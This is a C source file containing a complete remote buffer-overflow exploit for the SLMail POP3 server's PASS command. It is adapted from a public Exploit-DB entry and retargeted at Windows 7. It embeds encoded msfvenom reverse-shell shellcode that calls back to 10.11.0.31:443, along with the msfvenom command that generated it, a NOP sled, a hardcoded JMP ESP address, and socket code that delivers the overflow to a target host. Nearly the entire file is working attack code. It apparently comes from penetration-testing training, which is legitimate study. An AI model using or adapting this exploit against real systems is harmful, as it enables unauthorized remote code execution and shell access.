/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team

Modified from https://www.exploit-db.com/exploits/646 copyright and credit remain with author.

Changes
 - 'int' type of ptr to 'char' due to type err
 - re-align buffer and retaddr for Win7
 - shellcode to rev. shell 


*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] reverse shell 443
// [*] msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.31 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0d\x0a" -e x86/shikata_ga_nai EXITFUNC=thread
 
unsigned char shellcode[] = 
"\xba\xcf\xf4\x8a\x94\xd9\xec\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x52\x83\xc0\x04\x31\x50\x0e\x03\x9f\xfa\x68\x61\xe3\xeb\xef"
"\x8a\x1b\xec\x8f\x03\xfe\xdd\x8f\x70\x8b\x4e\x20\xf2\xd9\x62"
"\xcb\x56\xc9\xf1\xb9\x7e\xfe\xb2\x74\x59\x31\x42\x24\x99\x50"
"\xc0\x37\xce\xb2\xf9\xf7\x03\xb3\x3e\xe5\xee\xe1\x97\x61\x5c"
"\x15\x93\x3c\x5d\x9e\xef\xd1\xe5\x43\xa7\xd0\xc4\xd2\xb3\x8a"
"\xc6\xd5\x10\xa7\x4e\xcd\x75\x82\x19\x66\x4d\x78\x98\xae\x9f"
"\x81\x37\x8f\x2f\x70\x49\xc8\x88\x6b\x3c\x20\xeb\x16\x47\xf7"
"\x91\xcc\xc2\xe3\x32\x86\x75\xcf\xc3\x4b\xe3\x84\xc8\x20\x67"
"\xc2\xcc\xb7\xa4\x79\xe8\x3c\x4b\xad\x78\x06\x68\x69\x20\xdc"
"\x11\x28\x8c\xb3\x2e\x2a\x6f\x6b\x8b\x21\x82\x78\xa6\x68\xcb"
"\x4d\x8b\x92\x0b\xda\x9c\xe1\x39\x45\x37\x6d\x72\x0e\x91\x6a"
"\x75\x25\x65\xe4\x88\xc6\x96\x2d\x4f\x92\xc6\x45\x66\x9b\x8c"
"\x95\x87\x4e\x02\xc5\x27\x21\xe3\xb5\x87\x91\x8b\xdf\x07\xcd"
"\xac\xe0\xcd\x66\x46\x1b\x86\x82\x9c\x23\x49\xfb\xa0\x23\x74"
"\x40\x2d\xc5\x1c\xa6\x78\x5e\x89\x5f\x21\x14\x28\x9f\xff\x51"
"\x6a\x2b\x0c\xa6\x25\xdc\x79\xb4\xd2\x2c\x34\xe6\x75\x32\xe2"
"\x8e\x1a\xa1\x69\x4e\x54\xda\x25\x19\x31\x2c\x3c\xcf\xaf\x17"
"\x96\xed\x2d\xc1\xd1\xb5\xe9\x32\xdf\x34\x7f\x0e\xfb\x26\xb9"
"\x8f\x47\x12\x15\xc6\x11\xcc\xd3\xb0\xd3\xa6\x8d\x6f\xba\x2e"
"\x4b\x5c\x7d\x28\x54\x89\x0b\xd4\xe5\x64\x4a\xeb\xca\xe0\x5a"
"\x94\x36\x91\xa5\x4f\xf3\xb1\x47\x45\x0e\x5a\xde\x0c\xb3\x07"
"\xe1\xfb\xf0\x31\x62\x09\x89\xc5\x7a\x78\x8c\x82\x3c\x91\xfc"
"\x9b\xa8\x95\x53\x9b\xf8";


void exploit(int sock) {
      FILE *test;
      char *ptr; // changed from 'int' to 'char' type
      char userbuf[] = "USER madivan\r\n";
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 3001);
      memset(evil, 0x43, 3000);
      ptr = evil; // set ptr to evil buffer
      ptr = ptr + 2606; // changed ptr location for Win7
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 16;
      memcpy(ptr, &shellcode, 317);
      *(long*)&evil[2606] = 0x5F4A358F; // 5F4A358F JMP ESP - Microsoft Win7 Pro N - 6.1.7601 Service Pack 1 Build 7601 */

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Reverse shell on port 443...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
